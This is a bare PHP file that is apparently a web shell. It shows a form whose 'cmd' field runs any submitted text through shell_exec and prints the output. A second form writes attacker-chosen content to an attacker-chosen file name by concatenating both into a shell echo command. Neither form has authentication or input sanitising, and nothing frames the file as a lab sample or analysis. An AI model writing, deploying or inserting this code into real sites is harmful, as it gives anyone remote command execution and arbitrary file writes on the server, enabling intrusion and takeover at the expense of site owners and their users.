<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    $result = shell_exec($cmd);
    echo "<pre>" .$result. "</pre>";
}

if(isset($_POST['create'])){
    $fileName = $_POST['name'];
    $fileContent = $_POST['content'];
    $cmd = 'echo "' . $fileContent . '" > "' . $fileName . '"';
    $result = shell_exec($cmd);
    echo "<pre>" .$result. "</pre>";
}
?>
<!-- text box for executing command -->
<div class="executing">
    <laber for="cmd">Command</label>
    <form method="post">
        <p>Command: <input type="text" name="cmd"></p>
        <input type="submit" value="Execute">
    </form>
</div>

<!-- text box for adding file content -->
<div class="adding">
<laber for="file">Add File</label>
<form method="post">
    <p>File Name: <input type="text" name="name"></p>
    <p>File Content:</p> 
    <textarea name="content" rows="5" cols="40"></textarea>
    <br>
    <input type="submit" name="create" value="Create">
</form>
</div>
